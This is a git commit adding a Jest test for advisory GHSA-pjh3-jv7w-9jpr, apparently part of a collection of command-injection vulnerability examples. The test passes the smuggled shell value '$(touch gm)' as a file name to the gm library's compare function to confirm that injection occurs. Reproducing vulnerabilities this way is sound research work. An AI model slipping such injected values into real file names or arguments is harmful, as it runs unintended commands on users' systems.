4e050dc41ba18576da819bc5b78691487ba21dc1
Filipe Marques <filipe.s.marques@tecnico.ulisboa.pt>
2025-04-25 17:12:18 +0100

    Add GHSA-pjh3-jv7w-9jpr

---
+++ examples/command-injection/GHSA-pjh3-jv7w-9jpr/gm.test.js
@@ -0,0 +1,28 @@
+test("Command Injection in gm", (done) => {
+  const gm = require("gm");
+  const fs = require("fs");
+  const path = "./gm";
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  gm.compare("$(touch gm)", "/path/to/another.png", function (
+    err,
+    isEqual,
+    equality,
+    raw,
+    path1,
+    path2
+  ) {
+    file_exist = fs.existsSync(path);
+    expect(file_exist).toBe(true);
+    fs.unlink(path, function (err) {
+      done();
+    });
+  });
+});
